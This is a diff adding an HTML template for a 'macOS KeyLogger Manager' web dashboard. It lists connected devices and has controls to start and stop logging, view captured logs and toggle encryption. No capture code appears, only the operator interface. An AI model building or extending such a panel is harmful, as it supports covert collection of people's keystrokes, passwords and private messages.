@@ -1,0 +1,90 @@
+{% extends 'base.html' %}
+
+{% block title %}KeyLogger - macOS{% endblock %}
+
+{% block css %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/macos.css') }}">
+{% endblock %}
+
+{% block content %}
+<div class="container py-5">
+    <!-- Header -->
+    <div class="row mb-4">
+        <div class="col-md-12 text-center">
+            <h2>macOS KeyLogger Manager</h2>
+            <p class="lead">Monitor and manage your macOS devices securely</p>
+        </div>
+    </div>
+
+    <!-- Add this button after the header section -->
+    <div class="row mb-4">
+        <div class="col-md-12">
+            <button class="btn btn-outline-secondary btn-lg px-4" onclick="createNewConnection()">
+                <i class="bi bi-plus-circle"></i> New Connection
+            </button>
+        </div>
+    </div>
+
+    <!-- Connected Devices Section -->
+    <div class="row mb-5">
+        <div class="col-md-12">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <h4 class="mb-0">Connected Devices</h4>
+                    <button class="btn btn-warning" onclick="refreshDevices()">
+                        <i class="bi bi-arrow-clockwise"></i> Refresh
+                    </button>
+                </div>
+                <div class="card-body">
+                    <div id="devices-list">
+                        <!-- Devices will be loaded here dynamically -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Device Template -->
+    <template id="device-template">
+        <div class="device-item mb-4">
+            <div class="card">
+                <div class="card-body">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <h5 class="device-name mb-0">Device ID: <span class="device-id"></span></h5>
+                        <div class="device-status badge bg-success">Connected</div>
+                    </div>
+                    <div class="btn-group" role="group">
+                        <button class="btn btn-success start-btn" onclick="startLogging(this)">
+                            <i class="bi bi-play-fill"></i> Start
+                        </button>
+                        <button class="btn btn-danger stop-btn" onclick="stopLogging(this)" disabled>
+                            <i class="bi bi-stop-fill"></i> Stop
+                        </button>
+                        <button class="btn btn-info view-logs-btn" onclick="toggleLogs(this)">
+                            <i class="bi bi-eye"></i> View Logs
+                        </button>
+                        <button class="btn btn-warning" onclick="toggleEncryption(this)">
+                            <i class="bi bi-lock"></i> Toggle Encryption
+                        </button>
+                        <button class="btn btn-danger" onclick="removeDevice(this)">
+                            <i class="bi bi-trash"></i> Remove
+                        </button>
+                    </div>
+                    <div class="logs-container mt-3" style="display: none;">
+                        <div class="card">
+                            <div class="card-body">
+                                <pre class="logs-content">No logs available</pre>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </template>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script src="{{ url_for('static', filename='js/macos.js') }}"></script>
+{% endblock %}
